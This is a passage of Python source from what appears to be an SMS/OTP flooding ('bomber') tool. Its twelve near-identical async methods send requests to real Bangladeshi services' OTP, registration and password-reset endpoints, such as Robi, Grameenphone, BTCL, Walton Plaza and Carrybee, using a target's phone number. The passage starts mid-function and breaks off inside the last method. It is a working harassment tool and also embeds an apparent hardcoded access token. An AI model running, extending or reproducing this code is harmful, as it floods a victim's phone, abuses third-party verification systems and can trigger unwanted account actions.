            elif "BDSTall" in "API77 - KhaasFood Digits OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API77 - KhaasFood Digits OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API77 - KhaasFood Digits OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API77 - KhaasFood Digits OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API77 - KhaasFood Digits OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API77 - KhaasFood Digits OTP": payload = {"mobile": target}
            elif "Kirei" in "API77 - KhaasFood Digits OTP": payload = {"phone": target}
            elif "Shikho" in "API77 - KhaasFood Digits OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API77 - KhaasFood Digits OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API77 - KhaasFood Digits OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API77 - KhaasFood Digits OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API77 - KhaasFood Digits OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api78_robi_web_otp(self):
        target = self.target
        url = "https://www.robi.com.bd/en/v1"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API78 - Robi Web OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API78 - Robi Web OTP": pass
            elif "Bioscope" in "API78 - Robi Web OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API78 - Robi Web OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API78 - Robi Web OTP": payload = {"phone": target}
            elif "Medha" in "API78 - Robi Web OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API78 - Robi Web OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API78 - Robi Web OTP": payload = {"phone_number": target}
            elif "Arogga" in "API78 - Robi Web OTP": payload = {"mobile": target}
            elif "MyGP" in "API78 - Robi Web OTP": pass
            elif "BDSTall" in "API78 - Robi Web OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API78 - Robi Web OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API78 - Robi Web OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API78 - Robi Web OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API78 - Robi Web OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API78 - Robi Web OTP": payload = {"mobile": target}
            elif "Kirei" in "API78 - Robi Web OTP": payload = {"phone": target}
            elif "Shikho" in "API78 - Robi Web OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API78 - Robi Web OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API78 - Robi Web OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API78 - Robi Web OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API78 - Robi Web OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api79_sindabad_offers_otp_v2(self):
        target = self.target
        url = "https://offers.sindabad.com/api/mobile-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API79 - Sindabad Offers OTP v2": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API79 - Sindabad Offers OTP v2": pass
            elif "Bioscope" in "API79 - Sindabad Offers OTP v2": payload = {"number": "+88" + target}
            elif "Proiojon" in "API79 - Sindabad Offers OTP v2": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API79 - Sindabad Offers OTP v2": payload = {"phone": target}
            elif "Medha" in "API79 - Sindabad Offers OTP v2": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API79 - Sindabad Offers OTP v2": payload = {"number": "+88" + target}
            elif "Robi" in "API79 - Sindabad Offers OTP v2": payload = {"phone_number": target}
            elif "Arogga" in "API79 - Sindabad Offers OTP v2": payload = {"mobile": target}
            elif "MyGP" in "API79 - Sindabad Offers OTP v2": pass
            elif "BDSTall" in "API79 - Sindabad Offers OTP v2": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API79 - Sindabad Offers OTP v2": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API79 - Sindabad Offers OTP v2": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API79 - Sindabad Offers OTP v2": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API79 - Sindabad Offers OTP v2": payload = {"phoneNumber": target}
            elif "Sindabad" in "API79 - Sindabad Offers OTP v2": payload = {"mobile": target}
            elif "Kirei" in "API79 - Sindabad Offers OTP v2": payload = {"phone": target}
            elif "Shikho" in "API79 - Sindabad Offers OTP v2": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API79 - Sindabad Offers OTP v2": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API79 - Sindabad Offers OTP v2", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API79 - Sindabad Offers OTP v2", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API79 - Sindabad Offers OTP v2", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api80_gp_fi_fwa_otp(self):
        target = self.target
        url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API80 - GP FI FWA OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API80 - GP FI FWA OTP": pass
            elif "Bioscope" in "API80 - GP FI FWA OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API80 - GP FI FWA OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API80 - GP FI FWA OTP": payload = {"phone": target}
            elif "Medha" in "API80 - GP FI FWA OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API80 - GP FI FWA OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API80 - GP FI FWA OTP": payload = {"phone_number": target}
            elif "Arogga" in "API80 - GP FI FWA OTP": payload = {"mobile": target}
            elif "MyGP" in "API80 - GP FI FWA OTP": pass
            elif "BDSTall" in "API80 - GP FI FWA OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API80 - GP FI FWA OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API80 - GP FI FWA OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API80 - GP FI FWA OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API80 - GP FI FWA OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API80 - GP FI FWA OTP": payload = {"mobile": target}
            elif "Kirei" in "API80 - GP FI FWA OTP": payload = {"phone": target}
            elif "Shikho" in "API80 - GP FI FWA OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API80 - GP FI FWA OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API80 - GP FI FWA OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API80 - GP FI FWA OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API80 - GP FI FWA OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api81_kabbik_otp_v2(self):
        target = self.target
        url = "https://api.kabbik.com/v1/auth/otpnew2"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API81 - Kabbik OTP v2": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API81 - Kabbik OTP v2": pass
            elif "Bioscope" in "API81 - Kabbik OTP v2": payload = {"number": "+88" + target}
            elif "Proiojon" in "API81 - Kabbik OTP v2": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API81 - Kabbik OTP v2": payload = {"phone": target}
            elif "Medha" in "API81 - Kabbik OTP v2": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API81 - Kabbik OTP v2": payload = {"number": "+88" + target}
            elif "Robi" in "API81 - Kabbik OTP v2": payload = {"phone_number": target}
            elif "Arogga" in "API81 - Kabbik OTP v2": payload = {"mobile": target}
            elif "MyGP" in "API81 - Kabbik OTP v2": pass
            elif "BDSTall" in "API81 - Kabbik OTP v2": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API81 - Kabbik OTP v2": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API81 - Kabbik OTP v2": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API81 - Kabbik OTP v2": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API81 - Kabbik OTP v2": payload = {"phoneNumber": target}
            elif "Sindabad" in "API81 - Kabbik OTP v2": payload = {"mobile": target}
            elif "Kirei" in "API81 - Kabbik OTP v2": payload = {"phone": target}
            elif "Shikho" in "API81 - Kabbik OTP v2": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API81 - Kabbik OTP v2": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API81 - Kabbik OTP v2", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API81 - Kabbik OTP v2", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API81 - Kabbik OTP v2", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api82_sundora_otp_backend(self):
        target = self.target
        url = "https://otp-backend.fly.dev/api/otp/send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API82 - Sundora OTP Backend": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API82 - Sundora OTP Backend": pass
            elif "Bioscope" in "API82 - Sundora OTP Backend": payload = {"number": "+88" + target}
            elif "Proiojon" in "API82 - Sundora OTP Backend": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API82 - Sundora OTP Backend": payload = {"phone": target}
            elif "Medha" in "API82 - Sundora OTP Backend": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API82 - Sundora OTP Backend": payload = {"number": "+88" + target}
            elif "Robi" in "API82 - Sundora OTP Backend": payload = {"phone_number": target}
            elif "Arogga" in "API82 - Sundora OTP Backend": payload = {"mobile": target}
            elif "MyGP" in "API82 - Sundora OTP Backend": pass
            elif "BDSTall" in "API82 - Sundora OTP Backend": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API82 - Sundora OTP Backend": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API82 - Sundora OTP Backend": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API82 - Sundora OTP Backend": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API82 - Sundora OTP Backend": payload = {"phoneNumber": target}
            elif "Sindabad" in "API82 - Sundora OTP Backend": payload = {"mobile": target}
            elif "Kirei" in "API82 - Sundora OTP Backend": payload = {"phone": target}
            elif "Shikho" in "API82 - Sundora OTP Backend": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API82 - Sundora OTP Backend": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API82 - Sundora OTP Backend", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API82 - Sundora OTP Backend", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API82 - Sundora OTP Backend", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api83_walton_plaza_otp_v2(self):
        target = self.target
        url = "https://waltonplaza.com.bd/api/auth/otp/create"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API83 - Walton Plaza OTP v2": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API83 - Walton Plaza OTP v2": pass
            elif "Bioscope" in "API83 - Walton Plaza OTP v2": payload = {"number": "+88" + target}
            elif "Proiojon" in "API83 - Walton Plaza OTP v2": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API83 - Walton Plaza OTP v2": payload = {"phone": target}
            elif "Medha" in "API83 - Walton Plaza OTP v2": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API83 - Walton Plaza OTP v2": payload = {"number": "+88" + target}
            elif "Robi" in "API83 - Walton Plaza OTP v2": payload = {"phone_number": target}
            elif "Arogga" in "API83 - Walton Plaza OTP v2": payload = {"mobile": target}
            elif "MyGP" in "API83 - Walton Plaza OTP v2": pass
            elif "BDSTall" in "API83 - Walton Plaza OTP v2": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API83 - Walton Plaza OTP v2": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API83 - Walton Plaza OTP v2": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API83 - Walton Plaza OTP v2": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API83 - Walton Plaza OTP v2": payload = {"phoneNumber": target}
            elif "Sindabad" in "API83 - Walton Plaza OTP v2": payload = {"mobile": target}
            elif "Kirei" in "API83 - Walton Plaza OTP v2": payload = {"phone": target}
            elif "Shikho" in "API83 - Walton Plaza OTP v2": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API83 - Walton Plaza OTP v2": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API83 - Walton Plaza OTP v2", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API83 - Walton Plaza OTP v2", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API83 - Walton Plaza OTP v2", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api84_btcl_mybtcl_register(self):
        target = self.target
        url = "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API84 - BTCL MyBTCL Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API84 - BTCL MyBTCL Register": pass
            elif "Bioscope" in "API84 - BTCL MyBTCL Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API84 - BTCL MyBTCL Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API84 - BTCL MyBTCL Register": payload = {"phone": target}
            elif "Medha" in "API84 - BTCL MyBTCL Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API84 - BTCL MyBTCL Register": payload = {"number": "+88" + target}
            elif "Robi" in "API84 - BTCL MyBTCL Register": payload = {"phone_number": target}
            elif "Arogga" in "API84 - BTCL MyBTCL Register": payload = {"mobile": target}
            elif "MyGP" in "API84 - BTCL MyBTCL Register": pass
            elif "BDSTall" in "API84 - BTCL MyBTCL Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API84 - BTCL MyBTCL Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API84 - BTCL MyBTCL Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API84 - BTCL MyBTCL Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API84 - BTCL MyBTCL Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API84 - BTCL MyBTCL Register": payload = {"mobile": target}
            elif "Kirei" in "API84 - BTCL MyBTCL Register": payload = {"phone": target}
            elif "Shikho" in "API84 - BTCL MyBTCL Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API84 - BTCL MyBTCL Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API84 - BTCL MyBTCL Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API84 - BTCL MyBTCL Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API84 - BTCL MyBTCL Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api85_btcl_mybtcl_bcare(self):
        target = self.target
        url = "https://mybtcl.btcl.gov.bd/api/bcare/anonym/sendOTP.json"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API85 - BTCL MyBTCL Bcare": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API85 - BTCL MyBTCL Bcare": pass
            elif "Bioscope" in "API85 - BTCL MyBTCL Bcare": payload = {"number": "+88" + target}
            elif "Proiojon" in "API85 - BTCL MyBTCL Bcare": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API85 - BTCL MyBTCL Bcare": payload = {"phone": target}
            elif "Medha" in "API85 - BTCL MyBTCL Bcare": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API85 - BTCL MyBTCL Bcare": payload = {"number": "+88" + target}
            elif "Robi" in "API85 - BTCL MyBTCL Bcare": payload = {"phone_number": target}
            elif "Arogga" in "API85 - BTCL MyBTCL Bcare": payload = {"mobile": target}
            elif "MyGP" in "API85 - BTCL MyBTCL Bcare": pass
            elif "BDSTall" in "API85 - BTCL MyBTCL Bcare": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API85 - BTCL MyBTCL Bcare": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API85 - BTCL MyBTCL Bcare": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API85 - BTCL MyBTCL Bcare": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API85 - BTCL MyBTCL Bcare": payload = {"phoneNumber": target}
            elif "Sindabad" in "API85 - BTCL MyBTCL Bcare": payload = {"mobile": target}
            elif "Kirei" in "API85 - BTCL MyBTCL Bcare": payload = {"phone": target}
            elif "Shikho" in "API85 - BTCL MyBTCL Bcare": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API85 - BTCL MyBTCL Bcare": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API85 - BTCL MyBTCL Bcare", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API85 - BTCL MyBTCL Bcare", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API85 - BTCL MyBTCL Bcare", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api86_ecourier_individual_otp(self):
        target = self.target
        url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API86 - eCourier Individual OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API86 - eCourier Individual OTP": pass
            elif "Bioscope" in "API86 - eCourier Individual OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API86 - eCourier Individual OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API86 - eCourier Individual OTP": payload = {"phone": target}
            elif "Medha" in "API86 - eCourier Individual OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API86 - eCourier Individual OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API86 - eCourier Individual OTP": payload = {"phone_number": target}
            elif "Arogga" in "API86 - eCourier Individual OTP": payload = {"mobile": target}
            elif "MyGP" in "API86 - eCourier Individual OTP": pass
            elif "BDSTall" in "API86 - eCourier Individual OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API86 - eCourier Individual OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API86 - eCourier Individual OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API86 - eCourier Individual OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API86 - eCourier Individual OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API86 - eCourier Individual OTP": payload = {"mobile": target}
            elif "Kirei" in "API86 - eCourier Individual OTP": payload = {"phone": target}
            elif "Shikho" in "API86 - eCourier Individual OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API86 - eCourier Individual OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API86 - eCourier Individual OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API86 - eCourier Individual OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API86 - eCourier Individual OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api87_carrybee_merchant_register(self):
        target = self.target
        url = "https://api-merchant.carrybee.com/api/v2/merchant/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API87 - Carrybee Merchant Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API87 - Carrybee Merchant Register": pass
            elif "Bioscope" in "API87 - Carrybee Merchant Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API87 - Carrybee Merchant Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API87 - Carrybee Merchant Register": payload = {"phone": target}
            elif "Medha" in "API87 - Carrybee Merchant Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API87 - Carrybee Merchant Register": payload = {"number": "+88" + target}
            elif "Robi" in "API87 - Carrybee Merchant Register": payload = {"phone_number": target}
            elif "Arogga" in "API87 - Carrybee Merchant Register": payload = {"mobile": target}
            elif "MyGP" in "API87 - Carrybee Merchant Register": pass
            elif "BDSTall" in "API87 - Carrybee Merchant Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API87 - Carrybee Merchant Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API87 - Carrybee Merchant Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API87 - Carrybee Merchant Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API87 - Carrybee Merchant Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API87 - Carrybee Merchant Register": payload = {"mobile": target}
            elif "Kirei" in "API87 - Carrybee Merchant Register": payload = {"phone": target}
            elif "Shikho" in "API87 - Carrybee Merchant Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API87 - Carrybee Merchant Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API87 - Carrybee Merchant Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API87 - Carrybee Merchant Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API87 - Carrybee Merchant Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api88_carrybee_forget_password(self):
        target = self.target
        url = "https://api-merchant.carrybee.com/api/v2/forget-password"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API88 - Carrybee Forget Password": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API88 - Carrybee Forget Password": pass
            elif "Bioscope" in "API88 - Carrybee Forget Password": payload = {"number": "+88" + target}
            elif "Proiojon" in "API88 - Carrybee Forget Password": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API88 - Carrybee Forget Password": payload = {"phone": target}
            elif "Medha" in "API88 - Carrybee Forget Password": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API88 - Carrybee Forget Password": payload = {"number": "+88" + target}
            elif "Robi" in "API88 - Carrybee Forget Password": payload = {"phone_number": target}
            elif "Arogga" in "API88 - Carrybee Forget Password": payload = {"mobile": target}
            elif "MyGP" in "API88 - Carrybee Forget Password": pass
            elif "BDSTall" in "API88 - Carrybee Forget Password": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API88 - Carrybee Forget Password": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API88 - Carrybee Forget Password": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API88 - Carrybee Forget Password": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API88 - Carrybee Forget Password": payload = {"phoneNumber": target}
            elif "Sindabad" in "API88 - Carrybee Forget Password": payload = {"mobile": target}
            elif "Kirei" in "API88 - Carrybee Forget Password": payload = {"phone": target}
            elif "Shikho" in "API88 - Carrybee Forget Password": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API88 - Carrybee Forget Password": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API88 - Carrybee Forget Password", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
